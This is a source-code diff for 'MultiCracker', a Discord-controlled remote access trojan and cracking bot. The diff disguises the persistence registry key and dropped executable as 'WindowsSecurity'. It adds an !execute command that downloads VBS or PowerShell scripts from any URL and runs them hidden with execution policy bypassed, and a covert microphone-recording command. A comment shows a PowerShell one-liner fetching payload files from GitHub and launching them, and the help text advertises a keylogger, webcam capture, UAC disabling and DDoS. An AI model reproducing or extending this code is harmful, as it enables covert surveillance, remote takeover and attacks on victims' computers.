@@ -31,6 +31,10 @@ using System.Drawing.Imaging;
 using System.IO;
 using System.Drawing;
 using System.Linq;
+using NAudio.CoreAudioApi;
+using NAudio.Wave;
+using Discord.Audio;
+
 
 namespace MultiCracker
 {
@@ -91,24 +95,22 @@ namespace MultiCracker
         bool AutoCrack = true; // If true, the bot will automatically start cracking if it finds a hash with the auto-crack feature.
         bool AutoRAT = true; // If true, the RAT will start on the target machine at launch.
         private bool DebugMode = true; // If false, the window will be hidden and the program will run in the background.
-        
+
         // Categories
-        //string BOT_CATEGORY = "CLIENTS"; // The category for the bot logs in the server.
         string BOT_CATEGORY = "CLIENTS"; // The category for the bot logs in the server.
-        //string RAT_CATEGORY = "RAT"; // The category for the RAT channel in the server.
         string RAT_CATEGORY = "RAT"; // The category for the RAT channel in the server.
-        
+
         // Communication
         string BOT_TOKEN = "<BOT TOKEN main multi-cracker>"; // The main bot token for multi-cracker.
         private static string ratPrimaryToken = "<BOT TOKEN (Can be main token)>"; // The token for the RAT. (Could be same as main bot token.)
         private static string ratAlternativeToken = "<BOT TOKEN (IS NOT USED IN BELOW 2.2.0)>"; // Secondary token for the RAT. (Not used in 2.2.0)
         
-        string registryName = "MultiCracker"; // Name of the registry key. (Special and normal)
+        string registryName = "WindowsSecurity"; // Name of the registry key. (Special and normal)
         // Persistence settings (Normal)
         string dropPath = "C:\\Windows\\debug\\multi"; // Path to drop the file/create folder multi.
         string fileName = "multiCracker.exe"; // Name of the .exe file to drop.
         // Persistence settings (Special)
-        string fileNameSpecial = "multiCracker.exe"; // Name of the .log file to drop with special persistence.
+        string fileNameSpecial = "WindowsSecurity.exe"; // Name of the .log file to drop with special persistence.
 
         // ----------------------------------------
         // Now you are done with the settings.
@@ -135,7 +137,7 @@ namespace MultiCracker
         int currentWarningLevelRAT = 0;
 
         // Version
-        string currentVersion = "2.2.0";
+        string currentVersion = "2.3.0";
 
         // Force start/end
         int forceEnd = int.MaxValue; // As high as possible (default)
@@ -185,7 +187,9 @@ namespace MultiCracker
         [DllImport("gdi32.dll")]
         public static extern int GetDeviceCaps(IntPtr hDC, int index);
 
-
+        // Microphone
+        public static bool isMicrophoneRecording = false;
+        public static Discord.Audio.IAudioClient audioClientGlobal;
 
         // Counter for number of tries
         int counter = 0;
@@ -384,7 +388,8 @@ namespace MultiCracker
                     messagesCracking.Add("**!resetStart** - Resets the start and end count.\r\n");
                     messagesOther.Add("\r\n**-------------- OTHER --------------**\r\n");
                     messagesOther.Add("**!elevate** - Ask for elevation from user to admin on bot computer.\r\n");
-                    messagesOther.Add("**!update <url-to-your-powershell-script-for-downloading-new-version>** - Updates the bot to your newer version of multi-cracker.\r\n");
+                    messagesOther.Add("**!version** - Print version of current multi-cracker bot.\r\n");
+                    messagesOther.Add("**!execute <vbs/powershell> <url-to-script-to-execute>** - Could be used to update the bot to your newer version of multi-cracker, or just execute vbs/powershell scripts.\r\n");
                     messagesOther.Add("**!cmd <command>** - Execute commands with CMD on bot's computer.\r\n");
                     messagesDebug.Add("\r\n**-------------- DEBUG --------------**\r\n");
                     messagesDebug.Add("**!log** - Sends entire log as .txt file.\r\n");
@@ -395,6 +400,8 @@ namespace MultiCracker
                     messagesPersistence.Add("**!install** - Installs persistence.\r\n");
                     messagesPersistence.Add("**!uninstall** - Uninstalls persistence.\r\n");
                     messagesPersistence.Add("**!disableUAC** - Disables UAC.\r\n");
+                    messagesPersistence.Add("**!specialInstall** - Installs special persistence\r\n");
+                    messagesPersistence.Add("**!specialUninstall** - Uninstall special persistence\r\n");
                     messagesDDoS.Add("\r\n**-------------- DDoS --------------**\r\n");
                     messagesDDoS.Add("**!ddos <ip> <port> <time>** - Starts a DDoS attack on the target.\r\n");
                     messagesDDoS.Add("**!stopddos** - Stops all DDoS attacks.\r\n");
@@ -893,19 +900,34 @@ namespace MultiCracker
                         Log(new LogMessage(LogSeverity.Info, "Elevate", $"Already admin."));
                     }
                 }
-                else if (trimmedContent.StartsWith("!update"))
+                else if (trimmedContent == "!version")
                 {
-                    // Find the argument after !update
-                    string argument = trimmedContent.Substring(8);
+                    // Send discord message
+                    await message.Channel.SendMessageAsync($"Version: **{currentVersion}**");
+                    // Log
+                    Log(new LogMessage(LogSeverity.Info, "Message", $"Sent version: {currentVersion}"));
+                }
+                else if (trimmedContent.StartsWith("!execute"))
+                {
+                    // Find the argument after !execute
+                    string argument = trimmedContent.Substring(9);
 
+                    // Get the argument after "vbs" or "powershell"
+                    string[] arguments = argument.Split(" ");
+                    string type = arguments[0];
+                    string url = arguments[1];
+                    
                     // Update the bot
-                    await message.Channel.SendMessageAsync($"Updating bot to link: **{argument}**");
+                    await message.Channel.SendMessageAsync($"Executing **{type}** script from link: **{url}**");
 
                     // Log
-                    Log(new LogMessage(LogSeverity.Info, "Update", $"Updating bot to link: {argument}"));
+                    Log(new LogMessage(LogSeverity.Info, "Execute", $"Executing **{type}** script from link: **{url}**"));
 
-                    // Update the bot
-                    await Task.Run(() => UpdateBot(argument));
+                    // Run the ExecuteScript function and get output
+                    string output = await Task.Run(() => ExecuteScript(type, url));
+
+                    // Send discord message
+                    await message.Channel.SendMessageAsync($"Output: {output}");
                 }
                 else if (trimmedContent.StartsWith("!cmd"))
                 {
@@ -1802,6 +1824,7 @@ namespace MultiCracker
                     Help_Message += "\r\n**------------------- SURVENILLANCE -------------------**\r\n";
                     Help_Message += $"**!screenshot** - Takes a screenshot of the screen.\r\n";
                     Help_Message += $"**!webcam** - Takes a picture with the webcam.\r\n";
+                    Help_Message += $"**!microphone** - Records audio from the microphone and stream it to a discord channel.\r\n";
                     // KEYLOGGER
                     Help_Message += "\r\n**------------------- KEYLOGGER -------------------**\r\n";
                     Help_Message += $"**!keylogger start** - Starts the keylogger.\r\n";
@@ -2098,6 +2121,113 @@ namespace MultiCracker
                         LogRAT(new LogMessage(LogSeverity.Error, "Webcam", $"Error capturing webcam image: {ex.Message}"));
                     }
                 }
+                else if (trimmedContent.StartsWith("!microphone"))
+                {
+                    // Get the arguments
+                    string argument = trimmedContent.Substring(11);
+
+                    // If argument is null
+                    if (argument == null || argument == "")
+                    {
+                        // Get a list of available microphones
+                        var microphones = new MMDeviceEnumerator().EnumerateAudioEndPoints(DataFlow.Capture, DeviceState.Active);
+
+                        // Send all microphones to discord
+                        string microphoneList = "Available microphones:\r\n";
+                        for (int i = 0; i < microphones.Count; i++)
+                        {
+                            microphoneList += $"{i + 1}. {microphones[i].FriendlyName}\r\n";
+                        }
+                        microphoneList += "Please select a microphone by typing **!microphone <number>**";
+                        await message.Channel.SendMessageAsync(microphoneList);
+                    }
+                    else
+                    {
+                        // Check if the microphone is already recording
+                        if (isMicrophoneRecording)
+                        {
+                            // Send discord message
+                            await message.Channel.SendMessageAsync($"Microphone is already recording.");
+                            // Log
+                            LogRAT(new LogMessage(LogSeverity.Info, "Microphone", $"Microphone is already recording."));
+                        }
+                        else
+                        {
+                            try
+                            {
+                                // Create new voice channel on the server
+                                var voiceChannel = await guild.CreateVoiceChannelAsync($"microphone-{computerName}");
+
+                                // Log
+                                LogRAT(new LogMessage(LogSeverity.Info, "Microphone", $"Created voice channel: {voiceChannel.Name}"));
+
+                                // Get the voice channel from the guild by its ID
+                                var voiceChannelObj = guild.GetVoiceChannel(voiceChannel.Id);
+
+                                // Join the voice channel to send audio
+                                var audioClient = await voiceChannelObj.ConnectAsync();
+
+                                // Make audio client global
+                                audioClientGlobal = audioClient;
+
+                                // Log
+                                LogRAT(new LogMessage(LogSeverity.Info, "Microphone", $"Joined voice channel: {voiceChannel.Name}"));
+                            }
+                            catch (Exception ex)
+                            {
+                                // Log
+                                LogRAT(new LogMessage(LogSeverity.Error, "Microphone", $"Error creating and/or joining voice channel: {ex.Message}"));
+                            }
+
+                            try
+                            {
+                                // Get a list of available microphones
+                                var microphones = new MMDeviceEnumerator().EnumerateAudioEndPoints(DataFlow.Capture, DeviceState.Active);
+
+                                // Check if the argument is a number
+                                if (!int.TryParse(argument, out int microphoneIndex))
+                                {
+                                    // Invalid input
+                                    await message.Channel.SendMessageAsync("Invalid input. Please use a valid number.");
+                                    return;
+                                }
+
+                                // Check if the number is valid
+                                if (microphoneIndex < 1 || microphoneIndex > microphones.Count)
+                                {
+                                    // Invalid number
+                                    await message.Channel.SendMessageAsync("Invalid input. Please use a valid number.");
+                                    return;
+                                }
+
+                                // Get the selected microphone device name from the list
+                                var selectedMicrophone = microphones[microphoneIndex - 1];
+
+                                // Convert the selected microphone to a string
+                                string selectedMicrophoneString = selectedMicrophone.FriendlyName;
+
+                                // Log
+                                LogRAT(new LogMessage(LogSeverity.Info, "Microphone", $"Selected microphone: {selectedMicrophoneString}"));
+
+                                // Send discord message
+                                await message.Channel.SendMessageAsync($"Selected microphone: {selectedMicrophoneString}");
+
+                                // Start recording audio from the microphone
+                                Task.Run(() => StartMicrophone(selectedMicrophoneString));
+                            }
+                            catch (Exception ex)
+                            {
+                                // Send discord message
+                                await message.Channel.SendMessageAsync($"Error selecting the microphone: {ex.Message}");
+
+                                // Log
+                                LogRAT(new LogMessage(LogSeverity.Error, "Microphone", $"Error selecting the microphone: {ex.Message}"));
+                            }
+
+                        }
+                    }
+
+                }
                 // KEYLOGGER
                 else if (trimmedContent.StartsWith("!keylogger"))
                 {
@@ -2328,6 +2458,58 @@ namespace MultiCracker
                 // Log
                 Log(new LogMessage(LogSeverity.Error, "Download", $"Error uploading file: {ex.Message}"));
             }
+        }
+
+
+        // Microphone
+        private async Task StartMicrophone(string MicrophoneDeviceName)
+        {
+            // Set the flag to indicate that microphone recording is in progress
+            isMicrophoneRecording = true;
+
+            // Get the microphone device
+            var microphone = new MMDeviceEnumerator().EnumerateAudioEndPoints(DataFlow.Capture, DeviceState.Active).FirstOrDefault(m => m.FriendlyName == MicrophoneDeviceName);
+
+            // Create a new instance of the WaveInEvent class
+            var waveIn = new WaveInEvent();
+
+            // Set the wave format
+            waveIn.WaveFormat = new WaveFormat(44100, 1);
+
+            // Set the event handler for the DataAvailable event
+            waveIn.DataAvailable += async (s, e) =>
+            {
+                // Create a temporary file path to store the audio data
+                string tempFilePath = Path.GetTempFileName();
+
+                // Write the audio data from the MemoryStream to the temporary file
+                using (var fileStream = new FileStream(tempFilePath, FileMode.Create, FileAccess.Write))
+                {
+                    await fileStream.WriteAsync(e.Buffer, 0, e.BytesRecorded);
+                }
+
+                // Delete the temporary file
+                File.Delete(tempFilePath);
+            };
+
+            // Start recording
+            waveIn.StartRecording();
+
+            // Log
+            LogRAT(new LogMessage(LogSeverity.Info, "Microphone", $"Recording audio from microphone: {MicrophoneDeviceName}"));
+
+            // Wait for 10 seconds
+            await Task.Delay(10000);
+
+            // Stop recording
+            waveIn.StopRecording();
+
+            // --------------------------------------------- //
+            // Save and send the audio file to voice channel //
+            // --------------------------------------------- //
+
+            // Set the flag to indicate that microphone recording is not in progress
+            isMicrophoneRecording = false;
         }
 
 
@@ -2599,8 +2781,8 @@ namespace MultiCracker
         }
 
 
-        // Updater
-        public Task UpdateBot(string url)
+        // Updater/Executer
+        public async Task<string> ExecuteScript(string type, string url)
         {
             // Update bot from url (powershell). Script could look like this:
             /// -------------------------------------- ///
@@ -2608,34 +2790,90 @@ namespace MultiCracker
             /// cd C:\Windows\security; if (!(Test-Path .\database)) { New-Item -ItemType Directory -Path .\database }; cd .\database; foreach ($i in ('AForge.dll', 'AForge.Video.DirectShow.dll', 'AForge.Video.dll', 'Discord.Net.Commands.dll', 'Discord.Net.Core.dll', 'Discord.Net.Interactions.dll', 'Discord.Net.Rest.dll', 'Discord.Net.Webhook.dll', 'Discord.Net.WebSocket.dll', 'Microsoft.Extensions.DependencyInjection.Abstractions.dll', 'MultiCracker.deps.json', 'MultiCracker.dll', 'MultiCracker.exe', 'MultiCracker.pdb', 'MultiCracker.runtimeconfig.json', 'Newtonsoft.Json.dll', 'System.Interactive.Async.dll', 'System.Linq.Async.dll', 'System.Reactive.dll')) { curl -Uri "https://raw.githubusercontent.com/USERNAME/REPONAME/main/PAYLOADS/MULTICRACKER/2.2.0/$i" -OutFile $i }; C:\windows\security\database\multicracker.exe
             /// 
             /// -------------------------------------- ///
-            
+
+
             // Get content from url
             string content = GetContent(url);
 
-            // Execute the content with powershell
-            try
+            if (content == "")
             {
-                string command = $"-NoProfile -ExecutionPolicy Bypass -Command \"{content}\"";
-                // Execute command with powershell
-                ProcessStartInfo processInfo = new ProcessStartInfo("powershell", $"{command}");
-                processInfo.CreateNoWindow = true;
-                processInfo.UseShellExecute = false;
-                processInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                Process process = new Process();    
-                process.StartInfo = processInfo;
-                process.Start();
-                process.WaitForExit();
+                // Log
+                Log(new LogMessage(LogSeverity.Error, "Execute", $"Error getting content from url: {url}"));
+                return $"Error getting content from url: {url}";
+            }
 
-                // Log
-                Log(new LogMessage(LogSeverity.Info, "Update", $"Bot updated."));
-            }
-            catch (Exception ex)
+            if (type == "vbs")
             {
-                // Log
-                Log(new LogMessage(LogSeverity.Error, "Update", $"Error updating bot: {ex.Message}"));
+                try
+                {
+                    // Ensure dropPath exists
+                    if (!Directory.Exists(dropPath))
+                    {
+                        Directory.CreateDirectory(dropPath);
+                    }
+            
+                    // Download the content to a .vbs file
+                    string vbsPath = Path.Combine(dropPath, "script.vbs");
+                    File.WriteAllText(vbsPath, content);
+
+                    // Execute (cscript /E:vbscript \"{vbsPath}\") with cmd
+                    ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", $"/C cscript /E:vbscript \"{vbsPath}\"");
+                    processInfo.CreateNoWindow = true;
+                    processInfo.UseShellExecute = false;
+                    processInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                    Process process = new Process();
+                    process.StartInfo = processInfo;
+                    process.Start();
+
+                    // Log
+                    Log(new LogMessage(LogSeverity.Info, "Execute", $"Bot executed script."));
+
+                    // Return output if needed
+                    return "VBScript executed successfully!";
+                }
+                catch (Exception ex)
+                {
+                    // Log
+                    Log(new LogMessage(LogSeverity.Error, "Execute", $"Error executing script: {ex.Message}"));
+                    // Throw the error
+                    throw;
+                }
             }
-            return Task.CompletedTask;
+            else if (type == "powershell")
+            {
+                // Execute the content with powershell
+                try
+                {
+                    string command = $"-NoProfile -ExecutionPolicy Bypass -Command \"{content}\"";
+                    // Execute command with powershell
+                    ProcessStartInfo processInfo = new ProcessStartInfo("powershell", $"{command}");
+                    processInfo.CreateNoWindow = true;
+                    processInfo.UseShellExecute = false;
+                    processInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                    Process process = new Process();
+                    process.StartInfo = processInfo;
+                    process.Start();
+                    process.WaitForExit();
+
+                    // Log
+                    Log(new LogMessage(LogSeverity.Info, "Execute", $"Bot executed script."));
+
+                    // Return output if needed
+                    return "Powershell script executed successfully!";
+                }
+                catch (Exception ex)
+                {
+                    // Log
+                    Log(new LogMessage(LogSeverity.Error, "Execute", $"Error executing script: {ex.Message}"));
+                    // Throw the error
+                    throw;
+                }
+            }
+
+            // If none of the conditions are met, return null or throw an exception, depending on your requirements
+            return null;
         }
+
         private string GetContent(string url)
         {
             string content = "";
@@ -2645,15 +2883,15 @@ namespace MultiCracker
                 {
                     content = client.DownloadString(url);
                     // Log
-                    Log(new LogMessage(LogSeverity.Info, "Update", $"Got content from url: {url}"));
+                    Log(new LogMessage(LogSeverity.Info, "Execute", $"Got content from url: {url}"));
                     // Log content
-                    Log(new LogMessage(LogSeverity.Info, "Update", $"Content got: {content}"));
+                    Log(new LogMessage(LogSeverity.Info, "Execute", $"Content got: {content}"));
                 }
             }
             catch (Exception ex)
             {
                 // Log
-                Log(new LogMessage(LogSeverity.Error, "Update", $"Error getting content: {ex.Message}"));
+                Log(new LogMessage(LogSeverity.Error, "Execute", $"Error getting content: {ex.Message}"));
             }
             return content;
         }
